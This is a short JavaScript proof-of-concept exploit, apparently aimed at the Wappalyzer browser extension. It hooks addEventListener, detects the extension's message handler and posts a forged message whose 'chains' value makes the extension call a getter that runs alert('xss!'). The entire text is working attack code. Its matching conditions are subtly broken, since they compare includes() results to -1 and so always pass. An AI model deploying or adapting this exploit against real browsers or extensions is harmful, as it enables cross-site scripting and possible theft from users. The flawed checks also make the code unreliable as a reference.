// hook addEventListener
let rel = addEventListener;
addEventListener = (name, func, opt) => {
  if (
    name === "message" &&
    func &&
    func.toString().includes("wappalyzer.technologies") !== -1 &&
    func.toString().includes("removeEventListener") !== -1 &&
    func.toString().includes("__UNDEFINED__") !== -1 &&
    func.toString().includes("postMessage") !== -1
  ) {
    rel(name, func, opt);
    poc();
  } else {
    rel(name, func, opt);
  }
};

window.bad = {
  get xss() {
    alert("xss!");
  },
};

const poc = () => {
  postMessage({
    wappalyzer: {
      technologies: [
        {
          name: "xss",
          chains: ["bad.xss"],
        },
      ],
    },
  });
};
